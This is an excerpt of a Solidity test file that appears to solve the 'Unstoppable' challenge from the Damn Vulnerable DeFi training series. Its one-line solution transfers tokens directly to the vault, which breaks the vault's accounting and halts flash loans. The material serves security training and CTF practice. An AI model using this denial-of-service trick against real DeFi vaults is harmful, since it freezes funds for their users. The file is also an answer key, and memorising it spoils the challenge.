...
import {DamnValuableToken} from "../src/DVDtoken.sol";
import {UnstoppableVault, Owned} from "../src/UnstoppableVault.sol";
...
contract UnstoppableChallenge is Test {
    ...
    function test_unstoppable() public checkSolvedByPlayer {
        // yes , thats all what it takes to break this contract ;
        token.transfer(address(vault), 9e18);
    }
